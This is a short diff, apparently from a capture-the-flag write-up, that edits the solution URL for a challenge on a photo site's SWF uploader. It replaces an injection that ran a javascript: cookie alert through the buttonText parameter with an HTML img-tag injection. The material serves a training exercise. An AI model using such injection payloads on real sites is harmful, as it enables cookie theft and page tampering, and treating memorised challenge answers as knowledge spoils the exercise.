@@ -20,7 +20,7 @@ She also runs a small legit side project, a photo site which allows anyone to cr
 
 - Insert the following as the url
 
-`https://www.photobobbins.com/upload.swf?buttonText=%3Ca%20href=%27javascript:alert(document.cookie)%20%27%3EClick%20me%3C/a%3E`
+`https://www.photobobbins.com/upload.swf?buttonText=test%3Cimg%20src=%27http://demo.swfupload.org/v220/images/logo.gif%27%3E`
 
 - The flag should show up
 
